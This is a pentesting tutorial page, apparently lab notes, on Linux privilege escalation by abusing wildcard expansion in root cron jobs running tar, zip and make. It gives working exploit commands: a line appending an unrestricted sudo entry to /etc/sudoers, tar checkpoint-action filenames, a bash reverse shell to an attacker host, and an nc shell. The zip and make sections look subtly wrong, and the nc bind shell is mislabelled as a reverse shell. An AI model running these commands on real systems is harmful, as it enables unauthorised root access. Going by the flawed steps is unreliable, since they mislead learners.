---
title: Linux Wildcard Abuse
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Linux Wildcard Abuse

 wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

| **Character** | **Significance**                                                                                                                                      |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `*`           | An asterisk that can match any number of characters in a file name.                                                                                   |
| `?`           | Matches a single character.                                                                                                                           |
| `[ ]`         | Brackets enclose characters and can match any single one at the defined position.                                                                     |
| `~`           | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| `-`           | A hyphen within brackets will denote a range of characters.                                                                                           |

We see this in a cronjob:

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can abuse the wildcard `*`.  The key to this attack is how the wildcard * works in Linux. When used in a command like:

```
tar -zcf /home/htb-student/backup.tar.gz *
```

The shell expands `*` **before** executing the command. It replaces `*` with all filenames in the directory. So if we create these files in the directory:

```shell-session
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

Then the directory will contain:

```
--checkpoint=1 --checkpoint-action=exec=sh root.sh file1.txt file2.txt
```

And the actual command that will run is:

```
tar -zcf /home/htb-student/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh file1.txt file2.txt`
```

This means `tar` receives `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` as **actual command-line arguments**. Because `tar` supports these flags, it executes `sh root.sh`, leading to privilege escalation.


##   Abusing `tar` Wildcards in Cron Jobs

A cron job runs `tar` on a directory that you can write to.

**🚀 Exploitation Steps:**

```bash
# Create a malicious script that grants sudo access
echo 'echo "htb-student ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

We could also create a malicious script that opens a reverse shell like this root.sh one:

```
#!/bin/bash
bash -i >&/dev/tcp/$IPAttacker/1234 0>&1
```

```
# Create wildcard files that get interpreted as arguments
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```


Wait for cron job execution, then escalate

```
sudo -l
sudo su
```


## **Abusing `zip` Wildcard Expansion**

A cron job runs:

```bash
zip -r backup.zip *
```

You can write to the directory.

 **🚀 Exploitation Steps:**
  
```bash
echo 'mkfifo /tmp/f; nc -lvp 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1' > shell.sh
echo "" > "--unzip-command=sh shell.sh"
```

When `zip` runs, it executes the reverse shell.

##  **Exploiting `make` Wildcards**

A cron job runs:

```bash
make *
```

You can write to the directory.

**🚀 Exploitation Steps:**

```bash
echo 'all: ; /bin/bash' > Makefile
```

When `make` runs, it executes `/bin/bash`.
